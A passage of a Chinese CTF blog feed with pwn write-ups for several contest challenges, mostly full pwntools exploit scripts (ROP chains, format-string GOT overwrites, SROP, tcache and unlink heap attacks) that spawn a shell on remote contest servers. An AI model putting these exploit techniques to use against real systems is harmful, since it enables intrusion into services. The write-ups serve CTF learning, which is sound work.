0x00000000004012f1stdin = 0x404070 got_base = 0x404018nex = 0x0000000000401036start = 0x4010a0got_list = &#39;&#39;for i in range(7):    got_list += p64(nex)    nex += 0x10log.info(hex(len(got_list)))payload = &#39;a&#39; * 0x58 + p64(rdi_ret) + p64(0) + p64(rsi_r15_ret) + p64(got_base) + p64(0) + p64(syscall) +  p64(rdi_ret) + p64(1) + p64(rsi_r15_ret) + p64(stdin) + p64(0) + p64(syswrite) + p64(start)payload = payload.ljust(0xf0,&#39;a&#39;)sh.send(payload)sh.send(got_list)libc_base = u64(sh.recv(6).ljust(8,&#39;\x00&#39;)) - libc.symbols[&#39;_IO_2_1_stdin_&#39;]log.success(&#39;libc_base = &#39; + hex(libc_base))system = libc_base + libc.symbols[&quot;system&quot;]bin_sh = libc_base + libc.search(&quot;/bin/sh\x00&quot;).next()sh.recvuntil(&#39;&gt; &#39;)payload = &#39;a&#39; * 0x58 + p64(rdi_ret) + p64(bin_sh) + p64(system)sh.sendline(payload)sh.interactive()</code></pre><h1 id="The-Pwn-Inn"><a href="#The-Pwn-Inn" class="headerlink" title="The Pwn Inn"></a>The Pwn Inn</h1><p>格式化字符串,第一次修改exit got表为start,之后无限循环,可以泄露libc地址,最后修改printf got表为system地址即可,但必须一次修改完成</p><pre><code class="python">from pwn import *context.log_level = &#39;DEBUG&#39;sh = process(&#39;./the_pwn_inn&#39;)sh = remote(&#39;185.172.165.118&#39;,2626)libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)# gdb.attach(sh,&#39;b * 0x401319&#39;)exit_got = 0x404058printf_got = 0x404030start = 0x4010c0stack_chk_fail = 0x404028payload = &quot;%192c%8$hhnaaaaa&quot; + p64(exit_got)sh.recvuntil(&#39;name?&#39;)sh.sendline(payload)payload = &quot;%7$s;aaa&quot; + p64(printf_got)sh.recvuntil(&#39;name?&#39;)sh.sendline(payload)sh.recvuntil(&#39;Welcome &#39;)libc_base = u64(sh.recvuntil(&#39;;&#39;,drop=True).ljust(8,&#39;\x00&#39;)) - 0x0000000000064e10# libc_base = u64(sh.recvuntil(&#39;;&#39;,drop=True).ljust(8,&#39;\x00&#39;)) - libc.symbols[&quot;printf&quot;]log.success(&#39;libc_base = &#39; + hex(libc_base))one_gadget = libc_base + 0x45226system = libc_base + 0x0000000000055410# system = libc_base + libc.symbols[&#39;system&#39;]log.info(hex(one_gadget))sh.recvuntil(&#39;name?&#39;)payload = &quot;&quot;bef = system &amp; 0xfftot = 0for i in range(6):    tmp = system &amp; 0xff    x = tmp - tot &amp; 0xff    string = &quot;%&quot; + str(x) + &quot;c&quot;    string += &quot;%&quot; + str(18+i) + &quot;$hhn&quot;    off =  0x10 - len(string)    string = string + &#39;a&#39; * off    tot += x + off    payload += string    system = system &gt;&gt; 8for j in range(6):    payload += p64(printf_got + j)log.success(hex((len(payload))))sh.sendline(payload)sh.sendline(&#39;/bin/sh\x00&#39;)sh.interactive()</code></pre><h1 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h1><p>主要利用关键点是<code>p64(echo) + p64(syscall) + str(sigframe)</code><br>第一次返回地址是<code>0x401000</code>的<code>push rbp</code>而不是<code>0x40103D</code>的<code>call echo</code><br>不使用call,少了一次<code>push rip</code>,因此第二次进入的echo函数栈会被抬高<code>0x8</code>,第二次就返回到之前读入的syscall;<br>因此在第二次read读的时候输入15个字符,控制<code>rax = 15</code>执行sigreturn即可.</p><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &quot;amd64&quot;# sh = process(&#39;./echo&#39;)# sh = remote(&#39;185.172.165.118&#39;,9090)# gdb.attach(sh)# pause()syscall = 0x40104Cbin_sh = 0x401035echo = 0x401000sigframe = SigreturnFrame()sigframe.rax = constants.SYS_execvesigframe.rdi = bin_shsigframe.rsi = 0x0sigframe.rdx = 0x0sigframe.rip = syscallpayload = &#39;a&#39; * 15payload = payload.ljust(0x188,&#39;b&#39;) payload += p64(echo) + p64(syscall) + str(sigframe)sh.sendline(payload)# sh.sendline(&#39;a&#39; * 14)sh.interactive()</code></pre><h1 id="Return-Of-The-ROPs"><a href="#Return-Of-The-ROPs" class="headerlink" title="Return Of The ROPs"></a>Return Of The ROPs</h1><p>主要在于rop之前的md5爆破,用c写一个模拟程序即可,恶心的地方在于Ubuntu16.04的openSSL不带libcrypto,搞了半天最后还是直接起了docker</p><h2 id="md5-c"><a href="#md5-c" class="headerlink" title="md5.c"></a>md5.c</h2><pre><code class="c">#include &lt;openssl/md5.h&gt;#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;time.h&gt;int main(void){    MD5_CTX ctx;    time_t t;    unsigned char outmd[16];    char string[5];    memset(string,0,sizeof(string));    t = time(0);    for(int times = 0;times &lt; 90;++times)    {        srand(t);        for (int i = 0;i&lt;4;++i)        {            string[i] = rand() % 26 + 97;        }        puts(&quot;--------&quot;);        puts(string);        memset(outmd,0,sizeof(outmd));        MD5_Init(&amp;ctx);        MD5_Update(&amp;ctx,string,4);        MD5_Final(outmd,&amp;ctx);        // puts(outmd);        for(int j = 0;j&lt;16;++j)        {            printf(&quot;%02x&quot;,outmd[j]);        }        printf(&quot;\n&quot;);        getchar();        t ++;    }    return 0;}</code></pre><p>编译用<code>gcc md5.c -g -o md5test -lcrypto</code></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>好像可以用ret2csu,不过习惯直接用libc里面的gadgets了,就是远程libc版本试起来有点恶心;<br>直接system(‘/bin/sh’)好像有点问题,稳妥起见用的execve.</p><pre><code class="python">from pwn import *from ctypes import *context.log_level = &#39;DEBUG&#39;context.terminal = [&#39;tmux&#39;,&#39;sp&#39;,&#39;-h&#39;]# libssl = CDLL(&#39;./libcrypto.so.1.1&#39;)md5 = process(&#39;./md5test&#39;)# sh = process(&#39;./main.sh&#39;)sh =remote(&#39;185.172.165.118&#39;,2222)libc = ELF(&#39;./libc-2.31_ubuntu9.1.so&#39;)# libc = ELF(&#39;/lib/x86_64-linux-gnu/libc-2.27.so&#39;)sh.recvuntil(&#39;where MD5(X)[-6:] = &#39;)tar = sh.recv(6)log.info(tar)for i in range(100):    md5.recvuntil(&quot;--------\n&quot;)    string = md5.recvline()[:-1]    ans = md5.recvline()[-7:][:-1]    log.info(ans)    if(ans == tar):        log.success(string)        sh.sendline(string)        md5.close()        break    md5.sendline(&quot;&quot;)rdi_ret = 0x0000000000401263rsi_r15_ret = 0x0000000000401261puts_got = 0x404018start = 0x401070puts_plt = 0x401030gets_plt = 0x401050payload = &#39;a&#39; * 0x27 + &#39;z&#39; + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start)sh.recvuntil(&quot;say?\n&quot;)sh.sendline(payload)sh.recvuntil(&#39;az&#39;)sh.recv(3)libc_base = u64(sh.recv(6).ljust(8,&#39;\x00&#39;)) - libc.symbols[&#39;puts&#39;]log.success(&quot;libc_base = &quot; + hex(libc_base))system = libc_base + libc.symbols[&quot;system&quot;]execve = libc_base + libc.symbols[&quot;execve&quot;]bin_sh = libc_base + libc.search(&#39;/bin/sh\x00&#39;).next()rdx_r12_ret = 0x000000000011c371 + libc_baserdx_ret = 0x0000000000115b12 + libc_basepayload = &#39;a&#39; * 0x28 + p64(rdi_ret) + p64(bin_sh) + p64(rsi_r15_ret) + p64(0) + p64(0)payload += p64(rdx_r12_ret) + p64(0) +p64(0)  + p64(execve)sh.sendline(payload)sh.interactive()</code></pre><h1 id="Faking-till-you’re-Making"><a href="#Faking-till-you’re-Making" class="headerlink" title="Faking till you’re Making"></a>Faking till you’re Making</h1><p>和上一题一样的PoW,改成了sha256,稍作修改即可.<br>vuln利用点在于<code>house of spirit</code>,构造size = 0x41的假chunk,free之后被malloc出来即可栈溢出.</p><h2 id="sha256-c"><a href="#sha256-c" class="headerlink" title="sha256.c"></a>sha256.c</h2><pre><code class="c">#include &lt;openssl/sha.h&gt;#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;time.h&gt;int main(void){    SHA256_CTX ctx;    time_t t;    unsigned char outmd[SHA256_DIGEST_LENGTH];    char string[5];    memset(string,0,sizeof(string));    t = time(0);    for(int times = 0;times &lt; 90;++times)    {        srand(t);        for (int i = 0;i&lt;4;++i)        {            string[i] = rand() % 26 + 97;        }        puts(&quot;--------&quot;);        puts(string);        memset(outmd,0,sizeof(outmd));        // MD5_Init(&amp;ctx);        SHA256_Init(&amp;ctx);        SHA256_Update(&amp;ctx,string,4);        SHA256_Final(outmd,&amp;ctx);        // puts(outmd);        for(int j = 0;j&lt;32;++j)        {            printf(&quot;%02x&quot;,outmd[j]);        }        printf(&quot;\n&quot;);        getchar();        t ++;    }    return 0;}</code></pre><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><pre><code class="python">from pwn import *context.log_level = &#39;DEBUG&#39;context.terminal = [&#39;tmux&#39;,&#39;sp&#39;,&#39;-h&#39;]# libssl = CDLL(&#39;./libcrypto.so.1.1&#39;)sha = process(&#39;./shatest&#39;)# sh = process(&#39;./main.sh&#39;)sh = remote(&#39;185.172.165.118&#39;,2929)# sh =remote(&#39;185.172.165.118&#39;,2222)# libc = ELF(&#39;./libc-2.31_ubuntu9.1.so&#39;)libc = ELF(&#39;/lib/x86_64-linux-gnu/libc-2.27.so&#39;)sh.recvuntil(&#39;where SHA256(X)[-6:] = &#39;)tar = sh.recv(6)log.info(tar)for i in range(100):    sha.recvuntil(&quot;--------\n&quot;)    string = sha.recvline()[:-1]    ans = sha.recvline()[-7:][:-1]    log.info(ans)    if(ans == tar):        log.success(string)        sh.sendline(string)        sha.close()        break    sha.sendline(&quot;&quot;)sh.recvuntil(&quot;that&#39;s correct\\n\n&quot;)backdoor = int(sh.recvline(),16)fake_chunk = p64(0) + p64(0x41) + p64(0) * 6 + p64(0) + p64(0x31)sh.send(fake_chunk)payload = &#39;a&#39; * 0x58 + p64(backdoor)sh.sendline(payload)# rdi_ret = 0x0000000000401263# rsi_r15_ret = 0x0000000000401261# puts_got = 0x404018# start = 0x401070# puts_plt = 0x401030# gets_plt = 0x401050# payload = &#39;a&#39; * 0x27 + &#39;z&#39; + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start)# sh.recvuntil(&quot;say?\n&quot;)# sh.sendline(payload)# sh.recvuntil(&#39;az&#39;)# sh.recv(3)# libc_base = u64(sh.recv(6).ljust(8,&#39;\x00&#39;)) - libc.symbols[&#39;puts&#39;]# log.success(&quot;libc_base = &quot; + hex(libc_base))# system = libc_base + libc.symbols[&quot;system&quot;]# execve = libc_base + libc.symbols[&quot;execve&quot;]# bin_sh = libc_base + libc.search(&#39;/bin/sh\x00&#39;).next()# rdx_r12_ret = 0x000000000011c371 + libc_base# rdx_ret = 0x0000000000115b12 + libc_base# payload = &#39;a&#39; * 0x28 + p64(rdi_ret) + p64(bin_sh) + p64(rsi_r15_ret) + p64(0) + p64(0)# payload += p64(rdx_r12_ret) + p64(0) +p64(0)  + p64(execve)# sh.sendline(payload)sh.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5space pwn writeup</title>
      <link href="/2020/06/24/5space-pwn-wp/"/>
      <url>/2020/06/24/5space-pwn-wp/</url>
      
        <content type="html"><![CDATA[<p>第五空间智能安全大赛pwn题的wp</p><a id="more"></a><h1 id="pwnme"><a href="#pwnme" class="headerlink" title="pwnme"></a>pwnme</h1><pre><code class="c">void edit(){  char v0; // [sp+4h] [bp-20h]  char v1; // [sp+Ch] [bp-18h]  int v2; // [sp+14h] [bp-10h]  int len; // [sp+18h] [bp-Ch]  int idx; // [sp+1Ch] [bp-8h]  if ( chunk_count )  {    printf(&quot;Index:&quot;);    read(0, &amp;v1, 8);    idx = atoi(&amp;v1);    if ( ptr_list[2 * idx] )    {      printf(&quot;Length:&quot;);      read(0, &amp;v0, 8);      len = atoi(&amp;v0);      printf(&quot;Tag:&quot;);      v2 = read(0, ptr_list[2 * idx], len);      *(_BYTE *)(ptr_list[2 * idx] + v2) = 0;    }    else    {      puts(&quot;Invalid&quot;);    }  }}</code></pre><p>arm pwn,漏洞点非常明显,无限制的edit,最难的是怎么跑起来</p><pre><code class="bash">sudo mv ld-uClibc-1.0.34.so ld-uClibc.so.0sudo mv ld-uClibc.so.0 /lib/sudo mv libuClibc-1.0.34.so libc.so.0sudo mv libc.so.0 /lib/ //显示缺什么就把ld和libc重命名过去</code></pre><p>之后</p><pre><code class="bash">qemu-arm -L ./lib ./a.out</code></pre><p>就可以运行了<br>调试的话</p><pre><code class="bash">qemu-arm -g 1234 -L ./lib ./a.out</code></pre><p>然后另开一个终端</p><pre><code class="bash">gdb-multiarch ./a.out -qpwndbg&gt; target remote localhost:1234</code></pre><p>即可调试</p><p>arm的libc似乎没有fastbin，所以利用方式选择是unlink。</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import *import syscontext.binary = &quot;./a.out&quot;#sh = process([&quot;qemu-arm&quot;, &quot;-g&quot;, &quot;1234&quot;, &quot;-L&quot;, &quot;./lib&quot;, &quot;./a.out&quot;])sh = remote(&#39;121.36.58.215&#39;,1337)sh.recvuntil(&#39;&gt;&gt;&gt; &#39;)elf = ELF(&quot;./a.out&quot;)context.log_level = &quot;debug&quot;def add(size,content):    sh.sendline(&#39;2&#39;)    sh.recvuntil(&quot;Length:&quot;)    sh.sendline(str(size))    sh.recvuntil(&quot;Tag:&quot;)    sh.sendline(content)    sh.recvuntil(&#39;&gt;&gt;&gt; &#39;)def show():    sh.sendline(&#39;1&#39;)    sh.recvuntil(&#39;1 : &#39;)    content = sh.recv(4)    sh.recvuntil(&#39;&gt;&gt;&gt; &#39;)    return contentdef edit(index,size,content):    sh.sendline(&#39;3&#39;)    sh.recvuntil(&quot;Index:&quot;)    sh.sendline(str(index))    sh.recvuntil(&#39;Length:&#39;)    sh.sendline(str(size))    sh.recvuntil(&quot;Tag:&quot;)    sh.send(content)    sh.recvuntil(&#39;&gt;&gt;&gt; &#39;)def delete(index):    sh.sendline(&#39;4&#39;)    sh.recvuntil(&#39;Tag:&#39;)    sh.sendline(str(index))    sh.recvuntil(&#39;&gt;&gt;&gt; &#39;)atoi_got = 0x21030add(0x60,&#39;a&#39;) #0add(0x60,&#39;a&#39;) #1add(0x20,&#39;a&#39;)payload = p32(0) + p32(0x61) + p32(0x2106C - 0xc) + p32(0x2106c - 0x8) + p32(0) * 20 + p32(0x60) + p32(0x68)edit(0,len(payload),payload)delete(1)payload = p32(0) * 3 + p32(0x2106c) + p32(0x60) + p32(atoi_got)edit(0,len(payload),payload)atoi_addr = u32(show())system_addr = atoi_addr - 0x4cc64 + 0x51800log.info(&quot;system_addr = &quot; + hex(system_addr))edit(1,4,p32(system_addr))sh.sendline(&#39;/bin/sh&#39;)sh.interactive()</code></pre><h1 id="twice"><a href="#twice" class="headerlink" title="twice"></a>twice</h1><p>第一次泄露canary和rbp，第二次栈溢出，由于只能溢出8字节，所以选择栈迁移到之前输入的0x58字节内容之中,rop即可</p><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import *from LibcSearcher import LibcSearchercontext.log_level = &#39;DEBUG&#39;#sh = process(&#39;./twice&#39;)sh = remote(&#39;121.36.59.116&#39;,9999)rdi_ret = 0x0000000000400923puts_plt = 0x4005c0puts_got = 0x601020start_addr = 0x400630rsp_rrr_ret = 0x000000000040091dleave_ret = 0x0000000000400879#gdb.attach(sh)sh.recvuntil(&#39;&gt;&#39;)payload = &#39;a&#39; * 0x58 + &#39;b&#39;sh.send(payload)sh.recvuntil(&#39;b&#39;)canary = (sh.recv(7)).rjust(8,&#39;\x00&#39;)stack = u64(sh.recv(6).ljust(8,&#39;\x00&#39;))log.info(&quot;stack_addr = &quot; + hex(stack))log.info(&quot;canary = &quot; + hex(u64(canary)))buf_addr = stack - 0x70payload = &#39;z&#39; * 0x8 + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start_addr)payload += (0x58 - len(payload)) * &#39;a&#39;payload += canary + p64(stack - 0x70) + p64(leave_ret) sh.send(payload)sh.recvuntil(&#39;zzzzzzzz&#39;)sh.recvuntil(&#39;\n&#39;)puts_addr = u64(sh.recv(6).ljust(8,&#39;\x00&#39;))log.info(&#39;puts_addr = &#39;+hex(puts_addr))libc = LibcSearcher(&quot;puts&quot;,puts_addr)libc_base = puts_addr - libc.dump(&#39;puts&#39;)system = libc_base + libc.dump(&#39;system&#39;)bin_sh = libc_base + libc.dump(&#39;str_bin_sh&#39;)payload = &#39;a&#39; * 0x58 + &#39;b&#39;sh.send(payload)sh.recvuntil(&#39;b&#39;)canary = (sh.recv(7)).rjust(8,&#39;\x00&#39;)stack = u64(sh.recv(6).ljust(8,&#39;\x00&#39;))log.info(&quot;stack_addr = &quot; + hex(stack))log.info(&quot;canary = &quot; + hex(u64(canary)))buf_addr = stack - 0x70payload = &#39;a&#39; * 0x8 + p64(rdi_ret) + p64(bin_sh) + p64(system) payload += (0x58 - len(payload)) * &#39;a&#39;payload += canary + p64(stack - 0x70) + p64(leave_ret) sh.send(payload)sh.interactive()</code></pre><h1 id="of"><a href="#of" class="headerlink" title="of"></a>of</h1><p>很坑，给的源代码里面有cookie作为check，但是实际上远程是free之后是没有清空cookie的,因此直接uaf + tcache利用即可，我选择修改free_hook</p><h2 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import * context.log_level = &quot;DEBUG&quot;context.terminal = [&#39;tmux&#39;, &#39;sp&#39;, &#39;-h&#39;]#sh = process(&#39;./of2&#39;)sh = remote(&#39;121.36.74.70&#39;,9999)sh.recvuntil(&#39;Your choice: &#39;)def add(index):    sh.sendline(&#39;1&#39;)    sh.sendlineafter(&#39;Index: &#39;,str(index))    sh.recvuntil(&#39;Your choice: &#39;)def edit(index,content):    sh.sendline(&#39;2&#39;)    sh.sendlineafter(&#39;Index: &#39;,str(index))    sh.sendafter(&#39;Content: &#39;,content)    sh.recvuntil(&#39;Your choice: &#39;)def show(index):    sh.sendline(&#39;3&#39;)    sh.sendlineafter(&#39;Index: &#39;,str(index))    sh.recvuntil(&#39;Content: &#39;)    content = sh.recv(6)    sh.recvuntil(&#39;Your choice: &#39;)    return contentdef delete(index):    sh.sendline(&#39;4&#39;)    sh.sendlineafter(&#39;Index: &#39;,str(index))    sh.recvuntil(&#39;Your choice: &#39;)#gdb.attach(sh)for i in range(9):    add(i)for i in range(8):    delete(i)libc_base = u64(show(7).ljust(8,b&#39;\x00&#39;)) - 0x3EBCA0log.info(&#39;libc_base = &#39;+hex(libc_base))malloc_hook = libc_base + 0x3EBC30free_hook = libc_base + 0x3ED8E8system = libc_base + 0x4f440edit(7,&#39;/bin/sh\x00&#39;)edit(6,p64(free_hook))add(0)add(1)edit(1,p64(system))delete(7)sh.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>de1ctf pwn stl_container writeup</title>
      <link href="/2020/05/04/de1ctf-pwn-stl-container-writeup/"/>
      <url>/2020/05/04/de1ctf-pwn-stl-container-writeup/</url>
      
        <content type="html"><![CDATA[<p>de1ctf pwn题 stl_container的wp.<br>这题花了大概1天半，我还是太菜了<em>(:з」∠)</em></p><a id="more"></a><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>libc-2.27的堆题目，使用了c++的四种stl。<br>主要漏洞点在2.vector的delete中，当连续free两个vector的chunk时，会有double_free.</p><pre><code class="bash">pwndbg&gt; tcachebinstcachebins0x20 [  3]: 0x55555576e430 —▸ 0x55555576e470 —▸ 0x55555576e450 ◂— 0x00xa0 [  5]: 0x55555576e5f0 ◂— 0x55555576e5f0</code></pre><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>因为题目的操作很复杂，每次add都是先malloc两个0x98的chunk再把第一个free掉，<br>每次add的大致过程应该是</p><pre><code class="c++">class Test;Test temp; //调用构造函数 malloc(0x98) 并且read()mVector.push_back(temp); //push时会重新malloc一个chunk 并且复制temp的内容//add结束 temp生命周期结束 调用析构函数free</code></pre><p>所以exp里面有几个操作比较值得单独说明。</p><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><pre><code class="python">add(1,&#39;\xf0&#39;) addr = u64(show(1,0).ljust(8,b&#39;\x00&#39;)) log.info(hex(addr))tcache = addr - 0x125f0log.success(&#39;tcache = &#39; + hex(tcache))add(3,p64(tcache)) </code></pre><p>第一行<code>add(1,&#39;\xf0&#39;)</code>是为了不破坏tcache上的doublefree链，操作过程为</p><ol><li>malloc(0x98) 得到<code>0x55555576e5f0</code>,tcache为<code>0x55555576e5f0</code>的fd,即依然为<code>0x55555576e5f0</code>,然后读入’\xf0’,fd依旧不变.</li><li>push_back时再malloc一次，得到chunk地址相同，fd还是不变.</li><li>free<code>0x55555576e5f0</code>,tcache链依旧不变.</li></ol><p>之后就可以show()来获得一个堆地址，然后这里选择写tcache结构体的地址.</p><ul><li>值得一提的是，这里一定要是<code>tcache</code>的地址，而不是<code>tcache + 0x10</code>的地址，因为需要修改tcache的size以供之后free使用.</li></ul><h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><pre><code class="python"># size = 0xa1; count(0xa1) = 1 ;entry(0xa1) = tcache + 0x90(即entry自身地址)payload = p64(0) + p64(0xa1) + p64(0) + p64(1) + p64(0) * 6 + p64(0) * 8 + p64(tcache + 0x90)payload = payload.ljust(0x98,b&#39;\x00&#39;)add(3,payload)</code></pre><p>add之前tcache链是<code>0x55555576e5f0 —▸ 0x55555575c000</code><br>此时add就可修改tcache的size和内容。<br>修改对应size的entry为他自身是为了保护entry链和留存下次add时继续修改.<br>该步骤后tcache内容为</p><pre><code class="bash">pwndbg&gt; tcachebinstcachebins0xa0 [  2]: 0x55555576e5f0 —▸ 0x55555575c090 ◂— 0x55555576e5f0</code></pre><h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><pre><code class="python">#fake_chunk  prev_size 伪造整个tcache 用于free tcache_chunk进入unsortedbinpayload = p64(tcache + 0x10) + p64(0) + p64(0xa0) + p64(0x21) + p64(0) * 2 + p64(0x20) + p64(0x21)payload = payload.ljust(0x98,b&#39;\x00&#39;)add(4,payload) #tcache + 0x90</code></pre><p>这步先修改entry为tcache+0x10 之后伪造一个chunk来绕过之后free tcache的检测.<br>伪造的结果:</p><pre><code class="bash">pwndbg&gt; heap              0x55555575c000 PREV_INUSE {  mchunk_prev_size = 0,  mchunk_size = 161,  fd = 0x0,  bk = 0x1,  fd_nextsize = 0x0,  bk_nextsize = 0x0}0x55555575c0a0 FASTBIN {  mchunk_prev_size = 160,  mchunk_size = 33,  fd = 0x0,  bk = 0x0,  fd_nextsize = 0x20,  bk_nextsize = 0x21 }0x55555575c0c0 FASTBIN {  mchunk_prev_size = 32,  mchunk_size = 33,  fd = 0x0,  bk = 0x0,  fd_nextsize = 0x0,  bk_nextsize = 0x0}</code></pre><h4 id="4"><a href="#4" class="headerlink" title="4"></a>4</h4><pre><code class="python">payload = p64(0) + p64(7) + p64(0) * 16 + p64(0xa0) #prev_sizepayload = payload.ljust(0x98,b&#39;\x00&#39;) add(4,payload) #tcache + 0x10add(1,&#39;\x00&#39;)libc_base = u64(show(1,0).ljust(8,b&#39;\x00&#39;)) - 0x3EBCA0log.success(&#39;libc_base = &#39; + hex(libc_base))one_gadget = libc_base + 0x4f322malloc_hook = libc_base + 0x3EBC30free_hook = libc_base + 0x3ED8E8#gdb.attach(sh)</code></pre><p>这一步修改count = 7 并且将entry修改为<code>NULL</code>.<br>因为如果<code>entry == NULL</code>就不会从tcache中拿chunk，而转而使用其他chunk。</p><pre><code class="c">if (tc_idx &lt; mp_.tcache_bins/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/ /* to appease gcc */&amp;&amp; tcache&amp;&amp; tcache-&gt;entries[tc_idx] != NULL){return tcache_get (tc_idx);}</code></pre><p><code>add(4,payload)</code>结束之后，temp被析构，因为count == 7，所以进入unsortedbin,将其add出来获取libc地址.</p><h4 id="5"><a href="#5" class="headerlink" title="5"></a>5</h4><pre><code class="python">delete(4,0)payload = p64(0) + p64(1) + p64(0) * 14 + p64(free_hook)payload = payload.ljust(0x98,b&#39;\x00&#39;)add(2,payload)add(2,p64(one_gadget))sh.interactive()</code></pre><p>之后将4中add(4)的那个chunk(就是tcache+0x10) free掉,tcache进入unsortedbin.<br>然后将其malloc出来修改count=1,entry为free_hook.<br>最后malloc出free_hook修改为one_gadget,temp析构,成功get shell.</p><h3 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h3><pre><code class="python">#encoding:utf-8from pwn import *context.log_level = &#39;DEBUG&#39;sh = process(&#39;./stl_container&#39;)def add(stl,content):    sh.sendline(str(stl))    sh.recvuntil(&#39;&gt;&gt; &#39;)    sh.sendline(&#39;1&#39;)    sh.recvuntil(&#39;input data:&#39;)    sh.send(content)    sh.recvuntil(&#39;&gt;&gt; &#39;,timeout=1)def delete(stl,index):    sh.sendline(str(stl))    sh.recvuntil(&#39;&gt;&gt; &#39;)    sh.sendline(&#39;2&#39;)    if(stl == 1 or stl == 2):        sh.recvuntil(&#39;index?\n&#39;)        sh.sendline(str(index))    sh.recvuntil(&#39;&gt;&gt; &#39;,timeout=1)def show(stl,index):    sh.sendline(str(stl))    sh.recvuntil(&#39;&gt;&gt; &#39;)    sh.sendline(&#39;3&#39;)    sh.recvuntil(&#39;index?\n&#39;)    sh.sendline(str(index))    sh.recvuntil(&#39;data: &#39;)    content = sh.recv(6,timeout=1)    log.info(content)    sh.recvuntil(&#39;&gt;&gt; &#39;,timeout=1)        return contentsh.recvuntil(&#39;&gt;&gt; &#39;)# add(1,&#39;aaa&#39;)# add(1,&#39;bbb&#39;)# delete(1,0)# delete(1,0)add(2,&#39;ccc&#39;) # 2 0add(2,&#39;ddd&#39;) # 2 1add(4,&#39;z&#39;) # 4 0add(4,&#39;z&#39;) # 4 1 gap_between_topdelete(4,0)delete(4,0)delete(2,0)delete(2,0)#gdb.attach(sh)add(1,&#39;\xf0&#39;) # 1 0addr = u64(show(1,0).ljust(8,b&#39;\x00&#39;)) log.info(hex(addr))tcache = addr - 0x125f0log.success(&#39;tcache = &#39; + hex(tcache))add(3,p64(tcache)) # 3 0payload = p64(0) + p64(0xa1) + p64(0) + p64(1) + p64(0) * 6 + p64(0) * 8 + p64(tcache + 0x90)payload = payload.ljust(0x98,b&#39;\x00&#39;)add(3,payload)#fake_chunk  prev_size 用于free进入unsortedbinpayload = p64(tcache + 0x10) + p64(0) + p64(0xa0) + p64(0x21) + p64(0) * 2 + p64(0x20) + p64(0x21)payload = payload.ljust(0x98,b&#39;\x00&#39;)add(4,payload) #tcache + 0x90payload = p64(0) + p64(7) + p64(0) * 16 + p64(0xa0) #prev_sizepayload = payload.ljust(0x98,b&#39;\x00&#39;) add(4,payload) #tcache + 0x10add(1,&#39;\x00&#39;)libc_base = u64(show(1,0).ljust(8,b&#39;\x00&#39;)) - 0x3EBCA0log.success(&#39;libc_base = &#39; + hex(libc_base))one_gadget = libc_base + 0x4f322malloc_hook = libc_base + 0x3EBC30free_hook = libc_base + 0x3ED8E8#gdb.attach(sh)delete(4,0)payload = p64(0) + p64(1) + p64(0) * 14 + p64(free_hook)payload = payload.ljust(0x98,b&#39;\x00&#39;)add(2,payload)add(2,p64(one_gadget))sh.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数字中国创新大赛虎符网络安全赛道pwn MarksMan writeup</title>
      <link href="/2020/04/19/hfb-writeup/"/>
      <url>/2020/04/19/hfb-writeup/</url>
      
        <content type="html"><![CDATA[<p>学习了通过修改<code>_dl_fini</code>中的一处函数指针来劫持程序流的利用方式</p><a id="more"></a><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>题目一开始给出了libc地址,并且允许任意地址写三字节。但是有<code>check()</code>函数会过滤掉三个<code>one_gadget</code>。</p><pre><code class="c">__int64 __fastcall main(__int64 a1, char **a2, char **a3){  signed int i; // [rsp+8h] [rbp-28h]  signed int j; // [rsp+Ch] [rbp-24h]  __int64 v6; // [rsp+10h] [rbp-20h]  char v7[3]; // [rsp+25h] [rbp-Bh]  unsigned __int64 v8; // [rsp+28h] [rbp-8h]  v8 = __readfsqword(0x28u);  setvbufs();  welcome();  puts(&quot;Free shooting games! Three bullets available!&quot;);  printf(&quot;I placed the target near: %p\n&quot;, &amp;puts);  puts(&quot;shoot!shoot!&quot;);  v6 = readl();  for ( i = 0; i &lt;= 2; ++i )  {    puts(&quot;biang!&quot;);    read(0, &amp;v7[i], 1uLL);    getchar();  }  if ( (unsigned int)check(v7) )  {    for ( j = 0; j &lt;= 2; ++j )      *(_BYTE *)(j + v6) = v7[j];  }  if ( !dlopen(0LL, 1) )                        // dlopen(NULL,RTLD_LAZY)    exit(1);  puts(&quot;bye~&quot;);  return 0LL;}signed __int64 __fastcall check(_BYTE *a1){  if ( (*a1 != 0xC5u || a1[1] != 0xF2u) &amp;&amp; (*a1 != 0x22 || a1[1] != 0xF3u) &amp;&amp; *a1 != 0x8Cu &amp;&amp; a1[1] != 0xA3u )    return 1LL;  puts(&quot;You always want a Gold Finger!&quot;);  return 0LL;}</code></pre><h2 id="利用方式"><a 